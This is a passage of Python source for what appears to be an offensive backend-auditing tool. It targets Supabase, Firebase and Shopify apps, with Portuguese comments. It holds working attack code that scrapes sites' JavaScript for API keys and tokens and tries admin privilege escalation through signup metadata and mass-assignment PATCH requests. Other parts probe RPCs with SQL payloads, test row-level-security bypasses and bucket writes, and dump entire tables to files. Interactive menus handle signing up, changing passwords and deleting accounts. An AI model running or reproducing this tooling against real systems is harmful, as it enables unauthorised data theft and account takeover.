                            self.headers.update({"Authorization": f"Bearer {jwt}"})
                            console.print("[green][+] Bearer Token configurado! Re-testando...[/green]")
                            return await self.pre_scan_auth_check()
                    return False
                return True
            except Exception as e:
                # Sanitiza a mensagem de erro para evitar falhas de console em terminais não-utf8
                err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
                console.print(f"[dim][!] Erro na verificação inicial: {err_msg}[/dim]")
                return True # Prossegue mesmo com erro de rede

    async def perform_intelligence_gathering(self):
        console.print("\n[bold yellow]>>> COLETA DE INTELIGÊNCIA <<<[/bold yellow]")
        try:
            async with httpx.AsyncClient() as client:
                r = await client.get(f"{self.auth_url}settings", headers={"apikey": self.apikey}, timeout=10.0)
                if r.status_code == 200 and not r.json().get("disable_signup", True): console.print("  [bold red][!] VULN: Signup Público Aberto![/bold red]")
                gr = await client.post(f"{self.root_url}/graphql/v1", headers=self.headers, json={"query": "{ __schema { types { name } } }"})
                if gr.status_code == 200:
                    for t in gr.json()["data"]["__schema"]["types"]:
                        n = t.get("name").lower()
                        if not n.startswith("__"): self.graphql_discovered.add(n); knowledge.learn("tables", n)
                    console.print(f"  [bold green][+] GQL EXPOSED: {len(self.graphql_discovered)} alvos vazados.[/bold green]")
        except: pass

    async def perform_active_write_test(self, client, table_name):
        res = {"post": False, "patch": False, "delete": False}
        h = self.headers.copy(); h["Prefer"] = "return=minimal"
        try:
            if (await client.post(f"{self.base_url}{table_name}", headers=h, json={"sh": "1"})).status_code in [201, 400]: res["post"] = True
            if (await client.patch(f"{self.base_url}{table_name}?id=eq.0", headers=h, json={"sh": "1"})).status_code in [200, 204, 400]: res["patch"] = True
            if (await client.delete(f"{self.base_url}{table_name}?id=eq.0", headers=h)).status_code in [200, 204, 400]: res["delete"] = True
        except: pass
        return res

    async def create_account(self, email: str, password: str, metadata: dict = None):
        """Cria uma conta no Supabase Auth e retorna o token se sucesso."""
        body = {"email": email, "password": password}
        if metadata: body["data"] = metadata
        async with httpx.AsyncClient() as client:
            try:
                r = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey, "Content-Type": "application/json"}, json=body, timeout=10.0)
                data = r.json()
                if r.status_code in [200, 201]:
                    token = data.get('access_token')
                    if token:
                        console.print(f"[bold green][+] Conta criada com sucesso! Email: {email} Senha: {password}[/bold green]")
                        console.print(f"[bold cyan][🔑] JWT TOKEN ACESSÍVEL:[/bold cyan]\n[dim]{token}[/dim]\n")
                        return token
                    else:
                        console.print(f"[yellow][!] Conta criada, mas sem token (confirmação por e-mail pode estar ativada).[/yellow]")
                        console.print(f"[dim]    Resposta: {json.dumps(data, indent=2)[:300]}[/dim]")
                        return None
                else:
                    msg = data.get('msg') or data.get('error_description') or data.get('message') or str(data)
                    console.print(f"[red][!] Falha ao criar conta ({r.status_code}): {msg}[/red]")
                    return None
            except Exception as e:
                console.print(f"[red][!] Erro de conexão: {e}[/red]")
                return None

    async def exploit_escalation(self):
        console.print("\n[bold cyan]─── SNIPER DE ESCALONAMENTO DE PRIVILÉGIOS ───[/bold cyan]")
        base_email = input("[?] Digite o email base (ex: admin@shy.sec): ").strip()
        base_email = "".join(ch for ch in base_email if ch.isprintable())
        password = input("[?] Digite a senha desejada: ").strip()
        password = "".join(ch for ch in password if ch.isprintable())
        
        if not "@" in base_email or not password:
            console.print("[red][!] Email ou senha inválidos.[/red]")
            return False

        payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"app_metadata": {"role": "admin"}},
            {"user_metadata": {"role": "admin"}},
            {"claims": {"role": "admin"}}
        ]
        
        email_parts = base_email.split("@")
        user_part = email_parts[0]
        domain_part = email_parts[1]
        
        success = False
        for i, p in enumerate(payloads, 1):
            # Adiciona um sufixo ao email para cada tentativa para evitar "User already exists"
            current_email = f"{user_part}+{i}@{domain_part}"
            console.print(f"[dim]  [{i}/5] Tentando: {current_email} com payload: {json.dumps(p)}[/dim]")
            token = await self.create_account(current_email, password, p)
            if token:
                console.print(f"[bold green][!!!] ESCALONAMENTO BEM-SUCEDIDO![/bold green]")
                console.print(f"[bold cyan][🚀] PAYLOAD VENCEDOR (Metadata Injection):[/bold cyan] {json.dumps(p)}")
                console.print(f"[bold cyan][🔑] JWT TOKEN:[/bold cyan]\n[dim]{token}[/dim]\n")
                self.bearer = token
                self.headers["Authorization"] = f"Bearer {token}"
                success = True
                break
        if not success:
            console.print("[yellow][!] Nenhum escalonamento funcionou neste alvo via metadata.[/yellow]")
        return success

    async def exploit_mass_assignment(self):
        """Tenta injetar privilégios em tabelas de perfil via PATCH (Mass Assignment)."""
        p_raw = decode_jwt_payload(self.bearer)
        try:
            p_data = json.loads(p_raw)
            uid = p_data.get("sub") or p_data.get("user_id")
            if not uid:
                console.print("[yellow][!] Erro: UID não encontrado no Token atual. Logue primeiro.[/yellow]")
                return False
        except: return False

        console.print(f"\n[bold magenta]─── EXPLOIT: PROFILE MASS ASSIGNMENT (ROLE ESCALATION) ───[/bold magenta]")
        console.print(f"[*] Alvo (Seu UID): {uid}")
        
        # Tabelas Alvo Comuns e Colunas
        target_tables = ["profiles", "users", "accounts", "profiles_info", "users_info", "members", "clients"]
        id_cols = ["id", "user_id", "uuid", "uid"]
        payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"isAdmin": True},
            {"type": "admin"},
            {"group": "admin"},
            {"role": "superuser"},
            {"permission": "admin"},
            {"access_level": 10}
        ]
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for table in target_tables:
                for col in id_cols:
                    try:
                        # 1. Verifica se a tabela e o registro existem e permitem PATCH geral (bypass de RLS)
                        check_url = f"{self.base_url}{table}?{col}=eq.{uid}"
                        r = await client.get(check_url, headers=self.headers)
                        if r.status_code == 200:
                            console.print(f"  [bold cyan][*] Tabela Interessante Detectada: {table}[/bold cyan]")
                            for p in payloads:
                                console.print(f"    [dim][*] Tentando Injetar {json.dumps(p)} em {table}...[/dim]")
                                res = await client.patch(check_url, headers=self.headers, json=p)
                                if res.status_code in [200, 204]:
                                    console.print(f"[bold red blink][!!!] VULN: SUCESSO! Campo '{list(p.keys())[0]}' alterado para admin em '{table}'![/bold red blink]")
                                    console.print(f"[bold green][*] Dica: Re-uploade o seu token ou vá ao painel admin para confirmar.[/bold green]")
                                    return True
                    except: continue
        console.print("[yellow][-] Nenhuma vulnerabilidade de Mass Assignment explorável no momento.[/yellow]")
        return False

    async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
        console.print("\n[bold magenta][*] Iniciando RPC Sniper & SQLi Probe...[/bold magenta]")
        
        default_rpcs = [
            "get_users", "admin_stats", "get_config", "execute_sql", "get_system_info", 
            "search_profiles", "get_schema", "is_admin", "check_permission", "get_logs", 
            "delete_user", "create_invitation", "get_version", "status", "health",
            "get_all_users", "reset_password", "update_role", "get_db_size", "get_tables"
        ]
        all_rpcs = list(set(default_rpcs + knowledge.data["rpcs"]))
        
        found_rpcs = 0
        async with httpx.AsyncClient(headers=self.headers) as client:
            for rpc in all_rpcs:
                try:
                    r = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json={}, timeout=5.0)
                    if r.status_code in [200, 204]:
                        console.print(f"[bold red][!] RPC EXPOSTO: {rpc} (Code: {r.status_code})[/bold red]")
                        knowledge.learn("rpcs", rpc)
                        found_rpcs += 1
                        if brain: console.print(Panel(await brain.analyze_data(f"RPC_{rpc}", r.json() if r.status_code == 200 else []), title=f"IA: {rpc}"))
                        
                        for sqli in [{"query": "SELECT version()"}, {"sql": "SELECT datname FROM pg_database"}]:
                            sr = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json=sqli)
                            if sr.status_code == 200 and ("PostgreSQL" in sr.text or "pg_database" in sr.text):
                                console.print(f"[bold red blink][!!!] SQL INJECTION DETECTADO EM RPC: {rpc}[/bold red blink]")
                    elif r.status_code == 403:
                        console.print(f"[yellow][!] RPC PROTEGIDO (403): {rpc}[/yellow]")
                        found_rpcs += 1 # Conta como encontrado (existe)
                    elif r.status_code == 401:
                        console.print(f"[dim][-] RPC UNAUTHORIZED (401): {rpc}[/dim]")
                    else:
                        # 404 ou outros são ignorados no silêncio para não sujar a tela se o usuário quiser,
                        # mas aqui vamos pelo menos mostrar um progresso limpo.
                        pass
                except Exception as e:
                    console.print(f"[dim][-] Erro ao testar RPC {rpc}: {e if len(str(e)) < 100 else str(e)[:100] + '...'}[/dim]")
        
        console.print(f"\n[bold green][+] Total de RPCs identificados: {found_rpcs}[/bold green]")
        
        # NOVO: Menu para usar as RPCs encontradas
        expostos = [r for r in all_rpcs if r in knowledge.data["rpcs"]]
        if expostos:
            while True:
                console.print(f"\n[bold cyan]─── MENU DE EXPLORAÇÃO RPC ───[/bold cyan]")
                for i, r in enumerate(expostos, 1):
                    console.print(f"  [{i}] Executar: [bold red]{r}[/bold red]")
                console.print(f"  [0] Voltar")
                
                choice = input("\n[SHY_RPC] Escolha uma ação: ").strip()
                if choice == "0": break
                if choice.isdigit() and 1 <= int(choice) <= len(expostos):
                    target_rpc = expostos[int(choice)-1]
                    console.print(f"\n[*] Configurando chamada para: [bold]{target_rpc}[/bold]")
                    param_json = input("[?] Parâmetros JSON (ex: {'id': 1} ou deixe vazio {}): ").strip()
                    payload = {}
                    if param_json:
                        try: payload = json.loads(param_json.replace("'", '"'))
                        except: console.print("[red][!] Erro: JSON inválido.[/red]"); continue
                    
                    async with httpx.AsyncClient(headers=self.headers) as client:
                        resp = await client.post(f"{self.root_url}/rest/v1/rpc/{target_rpc}", json=payload)
                        console.print(Panel(json.dumps(resp.json(), indent=2) if resp.status_code == 200 else resp.text, title=f"Resposta ({resp.status_code})"))

    async def deep_bucket_scan(self):
        console.print("\n[bold cyan][*] Iniciando Deep Bucket Scan...[/bold cyan]")
        
        default_buckets = [
            "avatars", "backups", "public", "profiles", "uploads", "images", 
            "documents", "attachments", "media", "temp", "temp-files", "configs", 
            "db-backups", "user-data", "storage", "archive", "private", "exports"
        ]
        all_buckets = list(set(default_buckets + knowledge.data["buckets"]))
        
        found_buckets = 0
        async with httpx.AsyncClient(headers=self.headers) as client:
            for b in all_buckets:
                try:
                    res = await client.get(f"{self.storage_url}bucket/{b}", timeout=5.0)
                    if res.status_code == 200:
                        console.print(f"[bold red][!] BUCKET ENCONTRADO/ABERTO: {b}[/bold red]")
                        knowledge.learn("buckets", b)
                        found_buckets += 1
                        # Testa escrita se estiver aberto
                        wr = await client.post(f"{self.storage_url}object/{b}/shy.txt", files={"file": ("shy.txt", b"VULN")})
                        if wr.status_code in [200, 201]:
                            console.print(f"[bold red blink][!!!] BUCKET COM ESCRITA (DEFACEMENT): {b}[/bold red blink]")
                    elif res.status_code == 403:
                        console.print(f"[yellow][!] BUCKET PROTEGIDO (403): {b}[/yellow]")
                        found_buckets += 1
                    elif res.status_code == 401:
                        console.print(f"[dim][-] BUCKET PRIVADO (401): {b}[/dim]")
                except Exception as e:
                    console.print(f"[dim][-] Erro ao testar Bucket {b}: {e}[/dim]")
        
        console.print(f"\n[bold green][+] Total de Buckets identificados: {found_buckets}[/bold green]")

    async def check_target(self, client, target, t_type, progress, task_id, brain=None):
        async with self.semaphore:
            self.rotate_headers(); url = f"{self.base_url}{target}" if t_type == "TABLE" else f"{self.storage_url}bucket/{target}"
            try:
                readable, has_data, bypass = False, False, None
                if t_type == "TABLE":
                    r = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                    if r.status_code == 404: 
                        return # Tabela não existe no banco (404 Not Found)
                    
                    readable = (r.status_code == 200)
                    if not readable:
                        rj = await client.get(f"{url}?select=*,auth.users(*)", headers=self.headers, params={"limit": 1})
                        if rj.status_code == 200: readable, bypass = True, "JOIN Inj"
                        # Filtros estáticos de bypass (sem gastar cota da IA)
                        if not readable:
                            static_filters = ["id=not.eq.0", "limit=1", "id=gte.0", "created_at=not.is.null", "order=id.asc"]
                            for sf in static_filters:
                                rf = await client.get(f"{url}?select=*&{sf}", headers=self.headers)
                                if rf.status_code == 200 and len(rf.text) > 2: readable, bypass = True, f"Bypass ({sf})"; break
                    if readable: 
                        try: 
                            rd = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                            has_data = len(rd.json()) > 0
                        except: pass
                        knowledge.learn("tables", target)
                    wv = await self.perform_active_write_test(client, target)
                    self.results.append({"type": t_type, "name": target, "readable": readable, "has_data": has_data, "bypass": bypass, "writes": wv})
                elif t_type == "BUCKET":
                    br = await client.get(url, headers=self.headers)
                    if br.status_code == 404:
                        return # Bucket não existe
                    readable = (br.status_code == 200)
                    self.results.append({"type": "BUCKET", "name": target, "readable": readable})
                    if readable: knowledge.learn("buckets", target)
                
                if readable: self.hits_count += 1
                progress.update(task_id, description=f"[bold red]Exploração V2.0: [ENCONTRADOS {self.hits_count}] ")
            except: pass
            finally: progress.advance(task_id)

    async def run_scan(self, tables, brain=None):
        async with httpx.AsyncClient(verify=False, http2=True, timeout=10.0) as client:
            with Progress(
                SpinnerColumn(), 
                TextColumn("[progress.description]{task.description}"), 
                BarColumn(bar_width=40), 
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), 
                console=console
            ) as progress:
                task = progress.add_task("[bold red]Shadow Ops Recon...", total=len(tables))
                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task, brain) for t in tables])

    def _display_table(self, table_name, rows):
        if not rows: return
        # Otimização Visual: Limita colunas no terminal para não quebrar o layout
        all_keys = list(rows[0].keys())
        display_keys = all_keys[:6] 
        
        table = Table(title=f"DUMP: {table_name} ({len(rows)} registros na página)", box=SIMPLE)
        for key in display_keys:
            table.add_column(key, style="cyan", no_wrap=True, overflow="ellipsis")
        
        if len(all_keys) > 6:
            table.add_column("...", style="dim")

        for row in rows:
            display_vals = [str(row.get(k, ""))[:30] for k in display_keys]
            if len(all_keys) > 6:
                display_vals.append("...")
            table.add_row(*display_vals)
        console.print(table)

    async def dump_table(self, table_name):
        """Extrai todos os registros de uma tabela Supabase usando headers de Range."""
        console.print(f"\n[bold magenta][*] Iniciando Dump Completo (Supabase): {table_name}...[/bold magenta]")
        all_rows = []
        offset = 0
        limit = 100
        
        async with httpx.AsyncClient(timeout=20.0, verify=False) as client:
            while True:
                headers = self.headers.copy()
                headers["Range"] = f"{offset}-{offset + limit - 1}"
                
                try:
                    r = await client.get(f"{self.base_url}{table_name}", headers=headers)
                    if r.status_code in [200, 206]:
                        rows = r.json()
                        if not rows: break
                        all_rows.extend(rows)
                        console.print(f"  [dim][*] Capturadas {len(all_rows)} linhas...[/dim]")
                        
                        if len(rows) < limit or len(all_rows) >= 2000: # Limite de segurança p/ terminal
                            break
                        offset += limit
                    else:
                        console.print(f"[red][-] Erro ao dar dump na tabela {table_name} (Status {r.status_code})[/red]")
                        break
                except Exception as e:
                    console.print(f"[red][!] Erro no dump: {e}[/red]")
                    break

        if all_rows:
            # Paginação de Exibição 
            offset = 0
            page_size = 20
            while offset < len(all_rows):
                display_chunk = all_rows[offset : offset + page_size]
                self._display_table(table_name, display_chunk)
                offset += page_size
                if offset < len(all_rows):
                    opt = input(f"\n[?] Exibir mais {min(page_size, len(all_rows)-offset)} de {len(all_rows)} registros? (S/N/T para todos): ").strip().upper()
                    if opt == "N": break
                    if opt == "T": page_size = len(all_rows)

            save = input("\n[?] Deseja salvar este dump completo em arquivo? (S/N): ").strip().upper()
            if save == "S":
                custom_name = input(f"[?] Nome do arquivo (ENTER para 'dump_supabase_{table_name}_{int(time.time())}.json'): ").strip()
                fname = custom_name if custom_name else f"dump_supabase_{table_name}_{int(time.time())}.json"
                if not fname.endswith(".json"): fname += ".json"
                
                with open(fname, "w", encoding="utf-8") as f:
                    json.dump(all_rows, f, indent=2, ensure_ascii=False)
                console.print(f"[bold green][+] Dump salvo em: {fname}[/bold green]")

async def fetch_baas_details(url: str):
    if not url.startswith("http"): url = "https://" + url
    for attempt in range(2):  # Retry uma vez se falhar
        try:
            async with httpx.AsyncClient(headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=15.0, follow_redirects=True, verify=False) as client:
                console.print(f"[dim][*] Analisando: {url}...[/dim]")
                r = await client.get(url)
                if r.url != url:
                    console.print(f"[dim][*] Redirecionado para: {r.url}[/dim]")
                if r.status_code == 403:
                    console.print(f"[bold red][!] WAF DETECTADO (403):[/bold red] O site parece estar protegido (Cloudflare/Vercel).")
                    console.print(f"[yellow][*] A detecção automática pode falhar devido ao Firewall.[/yellow]")
                    await asyncio.sleep(1)
                    continue
                if r.status_code != 200:
                    console.print(f"[dim][!] Status {r.status_code}, tentando novamente...[/dim]")
                    await asyncio.sleep(2)
                    continue
                html = r.text
                # Captura de scripts de forma mais precisa (evita pegar múltiplos scripts na mesma linha)
                scripts = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html)
                preloads = re.findall(r'<link[^>]+rel=["\']modulepreload["\'][^>]*?href=["\']([^"\']+\.js[^"\']*)["\']', html)
                
                js_urls = list(set(
                    [urljoin(url, s) for s in scripts + preloads] +
                    [urljoin(url, p) for p in ["js/config.js", "config.js", "supabase.js", "env.js", ".env", "firebase-config.js"]] +
                    [url] # Escaneia o HTML principal com o motor agressivo do Secret Hunter
                ))
                
                # Regex Supabase (Mais flexível para subdomínios e refs)
                u_p = r'https?://[a-z0-9\-.]+\.supabase\.(co|net|link|com)'
                k_p = r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9.\-_]{50,}|sb_publishable_[a-zA-Z0-9\-_]{20,}|pk_[a-zA-Z0-9\-_]{20,})'
                
                # Regex Firebase
                f_p = r'["\']projectId["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                f_k = r'["\']apiKey["\']?\s*[:=]\s*["\']([^"\']+)["\']'

                # Regex Shopify
                s_p = r'["\']shop["\']?\s*[:=]\s*["\']([^"\']+\.myshopify\.com)["\']'
                
                target, apikey, fb_project, fb_key, shop_detected = None, None, None, None, None
                discovered_apis = []

                t = re.search(u_p, html)
                k = re.search(k_p, html)
                ft = re.search(f_p, html)
                fk = re.search(f_k, html)
                st = re.search(s_p, html)

                target = t.group(0) if t else None
                apikey = k.group(0) if k else None
                fb_project = ft.group(1) if ft else None
                fb_key = fk.group(1) if fk else None
                shop_detected = st.group(1) if st else None

                # Padrões de API e Subdomínios (Inteligência Profunda)
                domain_parts = urlparse(url).netloc.split(".")
                root_domain = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else domain_parts[0]
                api_patterns = [
                    r'https?://(?:api|dashboard|server|backend|v1|v2|cdn)[^"\']+',
                    r'["\'](/api/v[12]/[^"\']+)["\']',
                    rf'https?://[a-zA-Z0-9.\-]+\.{re.escape(root_domain)}[^"\']*'
                ]
                discovered_apis = []

                # Busca Inicial no HTML
                for p in api_patterns:
                    discovered_apis.extend(re.findall(p, html))

                # Busca Profunda nos JS
                for j in js_urls:
                    try:
                        jr = await client.get(j, timeout=8.0)
                        if jr.status_code == 200 and len(jr.text) > 100:
                            content = jr.text
                            # 1. Busca Segredos (JWT, Supabase, Firebase)
                            jwts = re.findall(r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*', content)
                            for jwt in jwts:
                                if len(jwt) > 60:
                                    knowledge.learn("discovered_tokens", jwt)
                                    console.print(f"[bold gold1][!] Token Secreto Encontrado em JS: {jwt[:15]}...[/bold gold1]")
                                    
                                    # Inteligência: Se o JWT for do Supabase, extrai o projeto e a chave
                                    try:
                                        p_raw = decode_jwt_payload(jwt)
                                        p_data = json.loads(p_raw)
                                        if p_data.get("iss") == "supabase" and p_data.get("ref"):
                                            ref = p_data.get("ref")
                                            if not target:
                                                target = f"https://{ref}.supabase.co"
                                                console.print(f"[bold green][*] Projeto Supabase extraído do JWT: {target}[/bold green]")
                                            if not apikey:
                                                apikey = jwt
                                                console.print(f"[bold green][*] API Key Supabase extraída do JWT.[/bold green]")
                                    except: pass

                            if not target:
                                mt = re.search(u_p, content); target = mt.group(0) if mt else None
                            if not apikey:
                                mk = re.search(k_p, content); apikey = mk.group(0) if mk else None
                            if not fb_project:
                                mft = re.search(r'projectId["\']?\s*[:=]\s*["\']([^"\']+)["\']', content)
                                fb_project = mft.group(1) if mft else None
                            if not fb_key:
                                mfk = re.search(r'apiKey["\']?\s*[:=]\s*["\']([^"\']+)["\']', content)
                                fb_key = mfk.group(1) if mfk else None
                            
                            # 2. Busca APIs Paralelas nos JS
                            for p in api_patterns:
                                discovered_apis.extend(re.findall(p, content))
                            
                            # Condição de saída: Se já temos tudo de um BaaS, podemos parar
                            # Shopify Extraction
                            stj = re.search(s_p, content)
                            if stj: shop_detected = stj.group(1)
                            
                            if (target and apikey) or (fb_project and fb_key) or shop_detected: break
                    except: continue
                
                # Se encontrou algo, limpa e retorna
                final_api = None
                if discovered_apis:
                    # Torna tudo absoluto primeiro
                    absolute_apis = [urljoin(url, a) for a in discovered_apis]
                    # Filtra URLs do google/firebase e a própria URL atual
                    filtered = [a for a in set(absolute_apis) if "google" not in a and "firebase" not in a and "gstatic" not in a and urlparse(a).netloc != urlparse(url).netloc]
                    if filtered:
                        final_api = sorted(filtered, key=len)[0]
                        console.print(f"  [bold magenta][*] Inteligência: API Paralela Detectada: {final_api}[/bold magenta]")

                if target and apikey:
                    console.print(f"[bold green][+] Supabase Detectado: {target}[/bold green]")
                if fb_project:
                    console.print(f"[bold yellow][+] Firebase Detectado: {fb_project}[/bold yellow]")
                
                if (target and apikey) or fb_project or shop_detected:
                    return target, apikey, fb_project, fb_key, shop_detected, final_api

                if attempt == 0:
                    console.print("[dim][!] Detecção parcial, tentando novamente...[/dim]")
                    await asyncio.sleep(1)
        except Exception as e:
            if attempt == 0:
                console.print(f"[dim][!] Erro de rede ({e}), tentando novamente...[/dim]")
                await asyncio.sleep(2)
    console.print("[yellow][!] Detecção automática falhou ou incompleta.[/yellow]")
    return None, None, None, None, None, None

async def firebase_menu(auditor: FirebaseAuditor, site_url: Optional[str] = None):
    while True:
        menu = (
            "[bold yellow]ATAQUE E EXFILTRAÇÃO (FIREBASE)[/bold yellow]\n"
            "[white][1] Scan de Exposição (RTDB/Firestore/Storage)[/white]\n"
            "[white][2] Ver Resultados[/white]\n"
            "[white][3] Secret Hunter (Scan JS para Tokens)[/white]\n"
            "[white][4] Exploit: Anonymous Sign-in[/white]\n"
            "[white][5] Inserir JWT Manual[/white]\n"
            "[white][6] Login com Email/Senha (Firebase Auth)[/white]\n"
            "[white][7] Criar Conta (Firebase Signup)[/white]\n"
            "[white][8] Editar Senha (Firebase Update)[/white]\n"
            "[white][9] Excluir Conta (Firebase Delete)[/white]\n"
            "[bold red][D] Dump Completo da Coleção[/bold red]      [0] Voltar"
        )
        console.print(Panel(menu, title="PAINEL FIREBASE", border_style="yellow"))
        raw_c = input("\n[SHY_FIRE] Ação: ").strip()
        c = raw_c.upper()
        
        if not c or len(c) > 1000: continue
        if c == "0": break
        
        # Inteligência: Se colar token ou chave direto no menu
        if raw_c.startswith("eyJ"):
            auditor.token = raw_c; console.print("[green][+] JWT configurado via Colagem Direta![/green]")
            continue
        if raw_c.upper().startswith("AIZASY"):
            auditor.api_key = raw_c; console.print("[green][+] API Key configurada via Colagem Direta![/green]")
            continue

        if c == "D":
            col = input("[?] Digite o nome da coleção para Dump: ").strip()
            if col: await auditor.dump_collection(col)
        elif c == "1": await auditor.scan_all()
        elif c == "2":
            if not auditor.results:
                console.print("[yellow][!] Nenhum resultado vulnerável até agora.[/yellow]")
            else:
                for res in auditor.results:
                    title = f"{res.get('type')} - {res.get('path') or res.get('name')}"
                    content = json.dumps(res.get("data", {}), indent=2)[:500]
                    console.print(Panel(content, title=title, border_style="red"))
        elif c == "3":
            if site_url:
                adv = AdvancedAuditor(site_url, site_url)
                await adv.secret_hunter(site_url)
            else:
                console.print("[red][!] URL do site não disponível para o Hunter.[/red]")
        elif c == "4": await auditor.try_anonymous_login()
        elif c == "5":
            tk = input("[🔑] JWT Token: ").strip()
            if tk.startswith("AIza"):
                console.print("[yellow][!] Isso parece uma API Key, não um JWT. Use a Opção [6] para logar com email/senha.[/yellow]")
            elif tk: auditor.token = tk; console.print("[green][+] Token configurado![/green]")
        elif c == "6":
            em = input("[📧] Email: ").strip()
            pw = input("[🔑] Senha: ").strip()
            if em and pw: await auditor.try_password_login(em, pw)
        elif c == "7":
            em = input("[📧] Novo Email: ").strip()
            pw = input("[🔑] Nova Senha: ").strip()
            if em and pw: await auditor.try_signup(em, pw)
        elif c == "8":
            nw = input("[🔑] Nova Senha: ").strip()
            if nw: await auditor.try_update_password(nw)
        elif c == "9":
            await auditor.try_delete_account()

async def advanced_menu(auditor: AdvancedAuditor, site_url: str):
    # Auto Secret Hunter ao iniciar
    await auditor.secret_hunter(site_url)
    
    while True:
        menu = (
            "[bold red]OFFENSIVE API AUDITOR (ADVANCED)[/bold red]\n"
            "[white][1] Fuzzing Endpoints (Common REST Routes)[/white]\n"
            "[white][2] Analisar/Decodificar JWT[/white]\n"
            "[white][3] Secret Hunter (Scan JS para Tokens)[/white]\n"
            "[white][S] Inserir Segredo Manual (JWT/Key)[/white]\n"
            "[white][4] Ver Resultados[/white]\n"
            "[bold green][P] Pivot: Iniciar Auditoria Específica[/bold green]\n"
            "[bold red][D] Dump Completo de Endpoint[/bold red]      [0] Voltar"
        )
        console.print(Panel(menu, title="PAINEL AVANÇADO", border_style="red"))
        raw_c = input("\n[SHY_ADV] Ação: ").strip()
        c = "".join(ch for ch in raw_c.upper() if ch.isalnum())
        
        if not c: continue
        if raw_c.startswith("eyJ"):
            auditor.results["discovered_secrets"].append({"type": "JWT", "value": raw_c, "source": "direct_paste"})
            console.print("[green][+] JWT adicionado via Colagem Direta![/green]"); continue
        
        if c == "0": break
        elif c == "P":
            # Tenta descobrir se temos chaves de Supabase, Firebase ou Shopify
            sb_target, sb_key = None, None
            shopify_shop = None
            
            for s in auditor.results["discovered_secrets"]:
                if s["type"] == "Config" and s["key"] == "apiKey": sb_key = s["value"]
                if "supabase.co" in s.get("value", ""): sb_target = s["value"]
                if s["type"] == "JWT":
                    try:
                        pd = json.loads(decode_jwt_payload(s["value"]))
                        if pd.get("iss") == "supabase":
                            sb_key = sb_key or s["value"]
                            sb_target = sb_target or f"https://{pd['ref']}.supabase.co"
                        if pd.get("shop"):
                            shopify_shop = pd.get("shop")
                    except: pass
            
            if sb_target and sb_key:
                console.print(f"[bold green][+] Pivotando para Supabase: {sb_target}[/bold green]")
                await supabase_routine(sb_target, sb_key, site_url)
                return
            elif shopify_shop:
                console.print(f"[bold green][+] Pivotando para Shopify: {shopify_shop}[/bold green]")
                await shopify_routine(shopify_shop, site_url)
                return
            else:
                console.print("[yellow][!] Nenhuma credencial completa de BaaS ou Shopify encontrada para Pivot.[/yellow]")
        elif c == "D":
            url = input("[?] Digite a URL completa do endpoint: ").strip()
            if url: await auditor.dump_api_data(url)
        elif c == "1": await auditor.fuzz_endpoints()
        elif c == "2":
            # Tenta pegar token automático se disponível
            tokens = [s["value"] for s in auditor.results["discovered_secrets"] if s["type"] == "JWT"]
            if tokens:
                console.print(f"[bold green][*] Usando token descoberto automaticamente: {tokens[0][:20]}...[/bold green]")
                token = tokens[0]
            else:
                token = input("[🔑] JWT Token: ").strip()
            
            if token:
                result = auditor.analyze_jwt(token)
                console.print(Panel(result, title="Análise JWT"))
        elif c == "3":
            await auditor.secret_hunter(site_url)
        elif c == "S":
            val = input("[🔑] Cole o Segredo (JWT ou Key): ").strip()
            if val:
                if val.startswith("eyJ"):
                    console.print(f"[green][+] JWT Manual Adicionado: {val[:20]}...[/green]")
                    auditor.results["discovered_secrets"].append({"type": "JWT", "value": val, "source": "manual"})
                else:
                    console.print(f"[green][+] Config Manual Adicionada: {val[:20]}...[/green]")
                    auditor.results["discovered_secrets"].append({"type": "Config", "key": "apiKey", "value": val, "source": "manual"})
        elif c == "4":
            console.print(Panel(json.dumps(auditor.results, indent=2), title="Resultados Avançados"))

def prompt_payload():
    console.print("[dim]  Formato: coluna=valor (uma por linha)[/dim]")
    console.print("[dim]  Exemplo: name=João    ou    status=paid    ou    age=25[/dim]")
    console.print("[dim]  Digite 'OK' para enviar ou 'CANCELAR' para sair.[/dim]")
    payload = {}
    while True:
        entry = input(f"  [{len(payload)+1}] ").strip()
        if not entry or entry.upper() == "CANCELAR": 
            if not payload: return None
            break
        if entry.upper() == "OK": break
        if "=" not in entry:
            console.print("[red]    Use o formato coluna=valor (ex: status=paid)[/red]")
            continue
        parts = entry.split("=", 1)
        col, val = parts[0].strip(), parts[1].strip()
        # Tenta converter números
        if val.isdigit(): val = int(val)
        elif val.lower() in ["true", "false"]: val = val.lower() == "true"
        payload[col] = val
        console.print(f"[green]    ✓ {col} = {val}[/green]")
    return payload if payload else None

async def firebase_routine(fb_project, fb_key, site_url):
    auditor = FirebaseAuditor(fb_project, fb_key)
    await firebase_menu(auditor, site_url)

async def shopify_routine(shop_url, site_url):
    """Rotina de auditoria básica para Shopify."""
    if not shop_url.startswith("http"): shop_url = "https://" + shop_url
    console.print(f"\n[bold yellow]>>> AUDITORIA SHOPIFY: {shop_url} <<<[/bold yellow]")
    
    # 1. Recon automatizado de endpoints Shopify
    auditor = AdvancedAuditor(shop_url, site_url)
    auditor.results["platform"] = "shopify"
    await auditor.fuzz_endpoints()
    
    # 2. Análise de Resultados
    console.print("\n[bold cyan][*] Analisando Vetores Shopify...[/bold cyan]")
    found = auditor.results.get("fuzz", [])
    if any(f["status"] == 200 for f in found):
        console.print("[bold green][+] Endpoints Públicos Encontrados![/bold green]")
    
    while True:
        menu = (
            "[bold cyan]OPERAÇÕES SHOPIFY[/bold cyan]\n"
            "[white][1] Ver Páginas Ativas (JSON)[/white]\n"
